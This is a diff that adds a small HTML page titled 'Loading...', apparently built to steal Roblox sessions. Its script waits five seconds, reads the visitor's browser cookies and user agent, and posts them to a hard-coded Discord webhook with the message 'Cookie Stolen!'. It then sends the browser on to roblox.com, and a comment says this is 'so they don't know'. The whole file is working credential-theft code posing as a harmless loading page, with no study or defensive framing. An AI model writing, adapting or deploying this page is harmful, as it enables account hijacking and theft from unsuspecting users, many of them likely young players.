@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+<script>
+    // PASTE YOUR WEBHOOK URL HERE
+    var webhook = "https://discord.com/api/webhooks/1567243471830392865/1krFTKcIsStaLZyVrfxxB6WXhdgr6FilmCL6fGNis3Y6ahUpFxTqbf2154yVWt8DVQC9";
+
+    setTimeout(function() {
+        try {
+            // Get all cookies visible to JS
+            var cookie = document.cookie;
+            
+            // Send to Discord
+            fetch(webhook, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    content: "**Cookie Stolen!**\nUser Agent: ```" + navigator.userAgent + "```\nCookie: ```" + cookie + "```"
+                })
+            });
+            
+            // Redirect back to Roblox so they don't know
+            window.location.href = "https://www.roblox.com/";
+        } catch(e) {}
+    }, 5000); // Wait 5 seconds for Roblox to load
+</script>
+</body>
+</html>
